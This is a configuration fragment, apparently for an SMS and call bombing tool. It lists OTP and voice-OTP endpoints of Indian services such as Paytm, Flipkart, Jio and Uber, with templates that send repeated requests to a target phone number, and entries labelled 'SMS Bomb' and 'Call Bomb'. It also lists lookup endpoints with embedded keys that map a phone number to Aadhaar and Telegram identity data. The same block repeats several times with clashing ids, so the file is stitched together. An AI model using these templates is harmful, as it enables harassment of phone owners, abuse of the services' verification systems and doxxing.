      "url": "https://www.meesho.com/api/v2/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 15,
      "name": "CRED SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.cred.club/api/v1/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    
    // ============ CALL APIs (WORKING) ============
    {
      "id": 16,
      "name": "PhonePe Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.phonepe.com/api/v2/otp/voice",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}", "type": "voice" },
      "count": 3
    },
    {
      "id": 17,
      "name": "Paytm Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://accounts.paytm.com/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}", "channel": "voice" },
      "count": 3
    },
    {
      "id": 18,
      "name": "Google Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.google.com/voice/b/0/service/post",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber=%2B91{phone}&type=voice",
      "count": 3
    },
    {
      "id": 19,
      "name": "Amazon Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.amazon.in/ap/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "{phone}" },
      "count": 3
    },
    {
      "id": 20,
      "name": "Flipkart Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 3
    },
    {
      "id": 21,
      "name": "Swiggy Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.swiggy.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 3
    },
    {
      "id": 22,
      "name": "Zomato Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.zomato.com/php/voice_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 3
    },
    {
      "id": 23,
      "name": "Ola Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 24,
      "name": "Uber Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://auth.uber.com/v2/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 25,
      "name": "Airtel Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.airtel.in/voice/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 3
    },
    {
      "id": 26,
      "name": "Jio Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.jio.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    {
      "id": 27,
      "name": "Myntra Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.myntra.com/gw/voice/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    
    // ============ DATA APIS (BACKUP) ============
    {
      "id": 28,
      "name": "Number Info API",
      "type": "Data",
      "method": "GET",
      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 29,
      "name": "Aadhar Lookup",
      "type": "Data",
      "method": "GET",
      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 30,
      "name": "Telegram to Number",
      "type": "Data",
      "method": "GET",
      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
      "headers": {},
      "count": 1
    },
        {
      "id": 4,
      "name": "SMS Bomb - Service 1",
      "type": "SMS",
      "method": "POST",
      "url": "https://example1.com/api/send",
      "headers": {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
      },
      "body": {
        "phone": "{phone}",
        "message": "OTP: 123456"
      },
      "count": 2
    },
    {
      "id": 5,
      "name": "SMS Bomb - Service 2",
      "type": "SMS",
      "method": "POST",
      "url": "https://example2.com/api/otp",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "mobile={phone}&service=login",
      "count": 3
    },
    {
      "id": 6,
      "name": "Call Bomb - Service 1",
      "type": "Call",
      "method": "POST",
      "url": "https://callapi1.com/call",
      "headers": {},
      "body": {
        "phone": "{phone}"
      },
      "count": 1
    },
    // ============ SMS APIs (WORKING) ============
    {
      "id": 1,
      "name": "Paytm SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://accounts.paytm.com/signin/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 2,
      "name": "Flipkart SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/signup/status",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 5
    },
    {
      "id": 3,
      "name": "Amazon SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.amazon.in/ap/register",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 4,
      "name": "Swiggy SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.swiggy.com/api/auth/signup",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 5,
      "name": "Zomato SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.zomato.com/php/oauth_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 6,
      "name": "Ola SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/authentication/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 7,
      "name": "Uber SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://auth.uber.com/v2/oauth/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "+91{phone}" },
      "count": 5
    },
    {
      "id": 8,
      "name": "Airtel SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.airtel.in/thanks/api/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 5
    },
    {
      "id": 9,
      "name": "Jio SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.jio.com/api/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 10,
      "name": "Myntra SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 11,
      "name": "BigBasket SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.bigbasket.com/auth/otp/login/",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 12,
      "name": "Netflix SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.netflix.com/in/login/help",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 13,
      "name": "Hotstar SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 14,
      "name": "Meesho SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.meesho.com/api/v2/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 15,
      "name": "CRED SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.cred.club/api/v1/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    
    // ============ CALL APIs (WORKING) ============
    {
      "id": 16,
      "name": "PhonePe Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.phonepe.com/api/v2/otp/voice",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}", "type": "voice" },
      "count": 3
    },
    {
      "id": 17,
      "name": "Paytm Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://accounts.paytm.com/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}", "channel": "voice" },
      "count": 3
    },
    {
      "id": 18,
      "name": "Google Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.google.com/voice/b/0/service/post",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber=%2B91{phone}&type=voice",
      "count": 3
    },
    {
      "id": 19,
      "name": "Amazon Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.amazon.in/ap/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "{phone}" },
      "count": 3
    },
    {
      "id": 20,
      "name": "Flipkart Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 3
    },
    {
      "id": 21,
      "name": "Swiggy Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.swiggy.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 3
    },
    {
      "id": 22,
      "name": "Zomato Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.zomato.com/php/voice_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 3
    },
    {
      "id": 23,
      "name": "Ola Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 24,
      "name": "Uber Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://auth.uber.com/v2/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 25,
      "name": "Airtel Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.airtel.in/voice/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 3
    },
    {
      "id": 26,
      "name": "Jio Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.jio.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    {
      "id": 27,
      "name": "Myntra Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.myntra.com/gw/voice/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    
    // ============ DATA APIS (BACKUP) ============
    {
      "id": 28,
      "name": "Number Info API",
      "type": "Data",
      "method": "GET",
      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 29,
      "name": "Aadhar Lookup",
      "type": "Data",
      "method": "GET",
      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 30,
      "name": "Telegram to Number",
      "type": "Data",
      "method": "GET",
      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
      "headers": {},
      "count": 1
    },
        {
      "id": 4,
      "name": "SMS Bomb - Service 1",
      "type": "SMS",
      "method": "POST",
      "url": "https://example1.com/api/send",
      "headers": {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
      },
      "body": {
        "phone": "{phone}",
        "message": "OTP: 123456"
      },
      "count": 2
    },
    {
      "id": 5,
      "name": "SMS Bomb - Service 2",
      "type": "SMS",
      "method": "POST",
      "url": "https://example2.com/api/otp",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "mobile={phone}&service=login",
      "count": 3
    },
    {
      "id": 6,
      "name": "Call Bomb - Service 1",
      "type": "Call",
      "method": "POST",
      "url": "https://callapi1.com/call",
      "headers": {},
      "body": {
        "phone": "{phone}"
      },
      "count": 1
    },
    // ============ SMS APIs (WORKING) ============
    {
      "id": 1,
      "name": "Paytm SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://accounts.paytm.com/signin/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 2,
      "name": "Flipkart SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/signup/status",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 5
    },
    {
      "id": 3,
      "name": "Amazon SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.amazon.in/ap/register",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 4,
      "name": "Swiggy SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.swiggy.com/api/auth/signup",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 5,
      "name": "Zomato SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.zomato.com/php/oauth_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 6,
      "name": "Ola SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/authentication/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 7,
      "name": "Uber SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://auth.uber.com/v2/oauth/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "+91{phone}" },
      "count": 5
    },
    {
      "id": 8,
      "name": "Airtel SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.airtel.in/thanks/api/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 5
    },
    {
      "id": 9,
      "name": "Jio SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.jio.com/api/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 10,
      "name": "Myntra SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 11,
      "name": "BigBasket SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.bigbasket.com/auth/otp/login/",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 12,
      "name": "Netflix SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.netflix.com/in/login/help",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 13,
      "name": "Hotstar SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 14,
      "name": "Meesho SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.meesho.com/api/v2/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 15,
      "name": "CRED SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.cred.club/api/v1/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    
    // ============ CALL APIs (WORKING) ============
    {
      "id": 16,
      "name": "PhonePe Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.phonepe.com/api/v2/otp/voice",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}", "type": "voice" },
      "count": 3
    },
    {
      "id": 17,
      "name": "Paytm Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://accounts.paytm.com/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}", "channel": "voice" },
      "count": 3
    },
    {
      "id": 18,
      "name": "Google Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.google.com/voice/b/0/service/post",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber=%2B91{phone}&type=voice",
      "count": 3
    },
    {
      "id": 19,
      "name": "Amazon Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.amazon.in/ap/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "{phone}" },
      "count": 3
    },
    {
      "id": 20,
      "name": "Flipkart Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 3
    },
    {
      "id": 21,
      "name": "Swiggy Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.swiggy.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 3
    },
    {
      "id": 22,
      "name": "Zomato Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.zomato.com/php/voice_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 3
    },
    {
      "id": 23,
      "name": "Ola Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 24,
      "name": "Uber Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://auth.uber.com/v2/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 25,
      "name": "Airtel Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.airtel.in/voice/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 3
    },
    {
      "id": 26,
      "name": "Jio Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.jio.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    {
      "id": 27,
      "name": "Myntra Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.myntra.com/gw/voice/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    
    // ============ DATA APIS (BACKUP) ============
    {
      "id": 28,
      "name": "Number Info API",
      "type": "Data",
      "method": "GET",
      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 29,
      "name": "Aadhar Lookup",
      "type": "Data",
      "method": "GET",
      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 30,
      "name": "Telegram to Number",
      "type": "Data",
      "method": "GET",
      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
      "headers": {},
      "count": 1
    },
        {
      "id": 4,
      "name": "SMS Bomb - Service 1",
      "type": "SMS",
      "method": "POST",
      "url": "https://example1.com/api/send",
      "headers": {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
      },
      "body": {
        "phone": "{phone}",
        "message": "OTP: 123456"
      },
      "count": 2
    },
    {
      "id": 5,
      "name": "SMS Bomb - Service 2",
      "type": "SMS",
      "method": "POST",
      "url": "https://example2.com/api/otp",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "mobile={phone}&service=login",
      "count": 3
    },
    {
      "id": 6,
      "name": "Call Bomb - Service 1",
      "type": "Call",
      "method": "POST",
      "url": "https://callapi1.com/call",
      "headers": {},
      "body": {
        "phone": "{phone}"
      },
      "count": 1
    },
    // ============ SMS APIs (WORKING) ============
    {
      "id": 1,
      "name": "Paytm SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://accounts.paytm.com/signin/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 2,
      "name": "Flipkart SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/signup/status",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 5
    },
    {
      "id": 3,
      "name": "Amazon SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.amazon.in/ap/register",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 4,
      "name": "Swiggy SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.swiggy.com/api/auth/signup",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 5,
      "name": "Zomato SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.zomato.com/php/oauth_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 6,
      "name": "Ola SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/authentication/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 7,
      "name": "Uber SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://auth.uber.com/v2/oauth/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "+91{phone}" },
      "count": 5
    },
    {
      "id": 8,
      "name": "Airtel SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.airtel.in/thanks/api/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 5
    },
    {
      "id": 9,
      "name": "Jio SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.jio.com/api/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 10,
      "name": "Myntra SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.myntra.com/gw/authentication/v2/otp/generate",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 5
    },
    {
      "id": 11,
      "name": "BigBasket SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.bigbasket.com/auth/otp/login/",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 12,
      "name": "Netflix SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.netflix.com/in/login/help",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 5
    },
    {
      "id": 13,
      "name": "Hotstar SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.hotstar.com/in/aadhar/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    {
      "id": 14,
      "name": "Meesho SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.meesho.com/api/v2/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 5
    },
    {
      "id": 15,
      "name": "CRED SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://api.cred.club/api/v1/otp/send",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 5
    },
    
    // ============ CALL APIs (WORKING) ============
    {
      "id": 16,
      "name": "PhonePe Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.phonepe.com/api/v2/otp/voice",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}", "type": "voice" },
      "count": 3
    },
    {
      "id": 17,
      "name": "Paytm Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://accounts.paytm.com/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}", "channel": "voice" },
      "count": 3
    },
    {
      "id": 18,
      "name": "Google Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.google.com/voice/b/0/service/post",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber=%2B91{phone}&type=voice",
      "count": 3
    },
    {
      "id": 19,
      "name": "Amazon Voice Call",
      "type": "Call",
      "method": "POST",
      "url": "https://www.amazon.in/ap/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phoneNumber": "{phone}" },
      "count": 3
    },
    {
      "id": 20,
      "name": "Flipkart Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 3
    },
    {
      "id": 21,
      "name": "Swiggy Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.swiggy.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
      "count": 3
    },
    {
      "id": 22,
      "name": "Zomato Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.zomato.com/php/voice_otp.php",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}",
      "count": 3
    },
    {
      "id": 23,
      "name": "Ola Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://api.olacabs.com/v1/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 24,
      "name": "Uber Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://auth.uber.com/v2/voice-otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "+91{phone}" },
      "count": 3
    },
    {
      "id": 25,
      "name": "Airtel Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.airtel.in/voice/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "msisdn={phone}",
      "count": 3
    },
    {
      "id": 26,
      "name": "Jio Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.jio.com/api/voice/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    {
      "id": 27,
      "name": "Myntra Voice",
      "type": "Call",
      "method": "POST",
      "url": "https://www.myntra.com/gw/voice/v2/otp",
      "headers": { "Content-Type": "application/json" },
      "body": { "mobile": "{phone}" },
      "count": 3
    },
    
    // ============ DATA APIS (BACKUP) ============
    {
      "id": 28,
      "name": "Number Info API",
      "type": "Data",
      "method": "GET",
      "url": "https://number-info-rootxindia.vercel.app/?key=muhmlo&number={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 29,
      "name": "Aadhar Lookup",
      "type": "Data",
      "method": "GET",
      "url": "https://api-olive-five-53.vercel.app/aadhar?match={phone}",
      "headers": {},
      "count": 1
    },
    {
      "id": 30,
      "name": "Telegram to Number",
      "type": "Data",
      "method": "GET",
      "url": "https://tg-to-num-six.vercel.app/?key=rootxsuryansh&q={phone}",
      "headers": {},
      "count": 1
    },
        {
      "id": 4,
      "name": "SMS Bomb - Service 1",
      "type": "SMS",
      "method": "POST",
      "url": "https://example1.com/api/send",
      "headers": {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
      },
      "body": {
        "phone": "{phone}",
        "message": "OTP: 123456"
      },
      "count": 2
    },
    {
      "id": 5,
      "name": "SMS Bomb - Service 2",
      "type": "SMS",
      "method": "POST",
      "url": "https://example2.com/api/otp",
      "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "body": "mobile={phone}&service=login",
      "count": 3
    },
    {
      "id": 6,
      "name": "Call Bomb - Service 1",
      "type": "Call",
      "method": "POST",
      "url": "https://callapi1.com/call",
      "headers": {},
      "body": {
        "phone": "{phone}"
      },
      "count": 1
    },
    // ============ SMS APIs (WORKING) ============
    {
      "id": 1,
      "name": "Paytm SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://accounts.paytm.com/signin/otp",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phone={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 2,
      "name": "Flipkart SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.flipkart.com/api/6/user/signup/status",
      "headers": { "Content-Type": "application/json" },
      "body": { "loginId": "+91{phone}" },
      "count": 5
    },
    {
      "id": 3,
      "name": "Amazon SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.amazon.in/ap/register",
      "headers": { "Content-Type": "application/x-www-form-urlencoded" },
      "body": "phoneNumber={phone}&countryCode=+91",
      "count": 5
    },
    {
      "id": 4,
      "name": "Swiggy SMS",
      "type": "SMS",
      "method": "POST",
      "url": "https://www.swiggy.com/api/auth/signup",
      "headers": { "Content-Type": "application/json" },
      "body": { "phone": "{phone}" },
